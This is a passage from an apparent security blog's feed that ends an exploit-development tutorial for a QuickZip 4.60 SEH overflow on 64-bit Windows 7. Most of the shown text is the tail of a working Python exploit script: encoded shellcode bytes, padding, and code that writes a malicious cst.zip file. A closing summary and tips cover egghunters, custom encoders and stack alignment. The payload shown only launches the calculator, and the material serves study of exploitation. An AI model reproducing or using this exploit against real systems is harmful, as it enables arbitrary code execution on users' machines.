</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">227</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xbf</span>\<span class="n">xdc</span>\<span class="n">xae</span>\<span class="n">x26</span>\<span class="n">x3d</span>\<span class="n">xda</span>\<span class="n">xdd</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x5b</span>\<span class="n">x31</span>\<span class="n">xc9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb1</span>\<span class="n">x33</span>\<span class="n">x31</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x03</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x83</span>\<span class="n">x37</span>\<span class="n">x52</span>\<span class="n">xc4</span>\<span class="n">xc8</span>\<span class="n">x3b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x43</span>\<span class="n">x80</span>\<span class="n">x33</span>\<span class="n">xc3</span>\<span class="n">x94</span>\<span class="n">xf3</span>\<span class="n">xba</span>\<span class="n">x26</span>\<span class="n">xa5</span>\<span class="n">x21</span>\<span class="n">xd8</span>\<span class="n">x23</span>\<span class="n">x94</span>\<span class="n">xf5</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xaa</span>\<span class="n">x61</span>\<span class="n">x15</span>\<span class="n">x7d</span>\<span class="n">xfe</span>\<span class="n">x91</span>\<span class="n">xae</span>\<span class="n">xf3</span>\<span class="n">xd7</span>\<span class="n">x96</span>\<span class="n">x07</span>\<span class="n">xb9</span>\<span class="n">x01</span>\<span class="n">x99</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x98</span>\<span class="n">x0f</span>\<span class="n">x8e</span>\<span class="n">x75</span>\<span class="n">x5a</span>\<span class="n">x11</span>\<span class="n">x72</span>\<span class="n">x87</span>\<span class="n">x8f</span>\<span class="n">xf1</span>\<span class="n">x4b</span>\<span class="n">x48</span>\<span class="n">xc2</span>\<span class="n">xf0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x8c</span>\<span class="n">xb4</span>\<span class="n">x2d</span>\<span class="n">xa0</span>\<span class="n">x45</span>\<span class="n">xb3</span>\<span class="n">x9c</span>\<span class="n">x55</span>\<span class="n">xe1</span>\<span class="n">x81</span>\<span class="n">x1c</span>\<span class="n">x57</span>\<span class="n">x25</span>\<span class="n">x8e</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1d</span>\<span class="n">x2f</span>\<span class="n">x40</span>\<span class="n">x50</span>\<span class="n">xe9</span>\<span class="n">x85</span>\<span class="n">x4b</span>\<span class="n">x80</span>\<span class="n">x42</span>\<span class="n">x91</span>\<span class="n">x04</span>\<span class="n">x38</span>\<span class="n">xe8</span>\<span class="n">xfd</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb4</span>\<span class="n">x39</span>\<span class="n">x3d</span>\<span class="n">x1e</span>\<span class="n">x88</span>\<span class="n">x70</span>\<span class="n">x4a</span>\<span class="n">xd5</span>\<span class="n">x7a</span>\<span class="n">x83</span>\<span class="n">x9a</span>\<span class="n">x27</span>\<span class="n">x82</span>\<span class="n">xb2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xe2</span>\<span class="n">xe4</span>\<span class="n">xbd</span>\<span class="n">x7b</span>\<span class="n">xef</span>\<span class="n">xf5</span>\<span class="n">xfa</span>\<span class="n">xbb</span>\<span class="n">x10</span>\<span class="n">x80</span>\<span class="n">xf0</span>\<span class="n">xb8</span>\<span class="n">xad</span>\<span class="n">x93</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc2</span>\<span class="n">xc3</span>\<span class="n">x69</span>\<span class="n">x11</span>\<span class="n">xd7</span>\<span class="n">x63</span>\<span class="n">xf9</span>\<span class="n">x81</span>\<span class="n">x33</span>\<span class="n">x92</span>\<span class="n">x2e</span>\<span class="n">x57</span>\<span class="n">xb7</span>\<span class="n">x98</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x9b</span>\<span class="n">x13</span>\<span class="n">x9f</span>\<span class="n">xbc</span>\<span class="n">x1a</span>\<span class="n">xf7</span>\<span class="n">xab</span>\<span class="n">xb8</span>\<span class="n">x97</span>\<span class="n">xf6</span>\<span class="n">x7b</span>\<span class="n">x49</span>\<span class="n">xe3</span>\<span class="n">xdc</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5f</span>\<span class="n">x12</span>\<span class="n">xb7</span>\<span class="n">x7d</span>\<span class="n">xf9</span>\<span class="n">xfe</span>\<span class="n">x16</span>\<span class="n">x81</span>\<span class="n">x19</span>\<span class="n">xa6</span>\<span class="n">xc7</span>\<span class="n">x27</span>\<span class="n">x51</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x13</span>\<span class="n">x51</span>\<span class="n">x38</span>\<span class="n">x02</span>\<span class="n">xe2</span>\<span class="n">xd3</span>\<span class="n">x46</span>\<span class="n">x6b</span>\<span class="n">xe4</span>\<span class="n">xeb</span>\<span class="n">x48</span>\<span class="n">xdb</span>\<span class="n">x8d</span>\<span class="n">xda</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc3</span>\<span class="n">xb4</span>\<span class="n">xca</span>\<span class="n">xe2</span>\<span class="n">x01</span>\<span class="n">xf1</span>\<span class="n">x25</span>\<span class="n">xa9</span>\<span class="n">x08</span>\<span class="n">x53</span>\<span class="n">xae</span>\<span class="n">x74</span>\<span class="n">xd9</span>\<span class="n">xe6</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb3</span>\<span class="n">x86</span>\<span class="n">x37</span>\<span class="n">x24</span>\<span class="n">xca</span>\<span class="n">x04</span>\<span class="n">xb2</span>\<span class="n">xd4</span>\<span class="n">x29</span>\<span class="n">x14</span>\<span class="n">xb7</span>\<span class="n">xd1</span>\<span class="n">x76</span>\<span class="n">x92</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2b</span>\<span class="n">xab</span>\<span class="n">xe7</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x18</span>\<span class="n">x07</span>\<span class="n">x52</span>\<span class="n">x2f</span>\<span class="n">xff</span>\<span class="n">x9b</span>\<span class="n">x3e</span>\<span class="n">x9e</span>\<span class="n">x9a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1b</span>\<span class="n">xa4</span>\<span class="n">xde</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>    <span class="c"># padding</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span> <span class="o">+</span> <span class="n">payload</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>When we launch the generated <code>cst.zip</code> file, our exploit will run and after several seconds (as the egghunter goes through the application&rsquo;s memory to locate the &ldquo;egg&rdquo;) we should see the calculator binary open.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/32.shellcode%20final.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/32.shellcode%20final.png" alt="image" /></a></p>

<p>Success!!</p>

<h2>Summary</h2>

<p>That was pretty much it - we have successfully recreated the QuickZip exploit to work on 64 bit Windows 7!</p>

<p>To sum it up, we achieved this by creating an egghunter exploit using very limited allowed character set (pretty much ASCII printable), wrote our own encoder and jumped around the memory to get to the egghunter code and eventually the shellcode.</p>

<p>Few things to keep in mind:</p>

<ul>
<li>find out what characters you&rsquo;re allowed to use and keep that in mind when errors occur</li>
<li>do not get discouraged if the buffer size is not sufficient - get creative!</li>
<li>make sure you use correct egghunter code (32 bit vs. 64 bit) depending on a platform you&rsquo;re developing an exploit for</li>
<li>writing own encoder is not that hard, but it takes lots of practice and patience</li>
<li>make sure to align the stack before executing shellcode</li>
</ul>


<p>Anyway, hope you found it useful! As always, if you have any questions/ideas/suggestions or just wanna chat infosec, feel free to comment below or hit me up on Twitter <a href="https://twitter.com/TheKnapsy">@TheKnapsy</a> or IRC (mainly <strong>#vulnhub</strong> on freenode).</p>
]]></content>
  </entry>
  
</feed>
